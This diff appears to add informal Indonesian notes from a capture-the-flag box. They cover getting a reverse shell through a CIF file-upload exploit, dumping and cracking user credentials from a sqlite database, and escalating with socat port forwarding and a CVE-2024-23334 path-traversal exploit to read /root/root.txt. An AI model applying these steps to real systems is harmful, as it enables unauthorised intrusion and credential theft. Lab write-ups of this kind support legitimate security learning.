@@ -1,0 +1,19 @@
+1. scan nmap 22 5000 kebuka -> buka aja di web ip:5000 -> register dulu
+2. ada upload coba cari vuln CIF exploit
+3. ada tuh tinggal copas aja disini https://github.com/advisories/GHSA-vgv8-5cpj-qj2f
+4. ganti aja command disitu nya
+5. upload dah sebenernya bisa tapi entah ini kok 500 server error 
+6. ternyata eh ternyata 1000000 kali coba ternyata gini
+7. kan dari sananya dikasih example.cif kan -> nah itu di upload -> jadi, AWALNYA KITA SALAH SYNTAX 
+8. upload aja dapet revshell ke instance -> file db nya sqlite -> sqlite3 db.db -> .table -> select * from user;
+9. dapet creds user nya crackstation aja passwd nya -> ssh kesitu klaim flag
+
+
+pe: 
+1. di linpeas active port -> 8080 kebuka sebenenrya 53 kebuka tapi itukan dns 
+2. nah socat aja dicoba dulu wget https://github.com/andrew-d/static-binaries/raw/refs/heads/master/binaries/linux/x86_64/socat
+3. terus ./socat tcp-listen:6969,reuseaddr,fork tcp:localhost:8080 -> ke ip:6969 gada apa apa sih
+4. baca WU aja vuln nya ini ternyata: https://github.com/wizarddos/CVE-2024-23334 
+5. wget aja exploitnya -> python3 exploit.py -u http://127.0.0.1:8080/ -f /root/root.txt -d assets dapet flag
+6. jadi di exploit nya kasih dulu -d yang ga notfound misal /assets coba -> curl 127.0.0.1:8080/assets nah itu ga notfound
+7. ntar script nya nambahin ../ buat nyari /root/root.txt nya terus terus ampe status code 200  
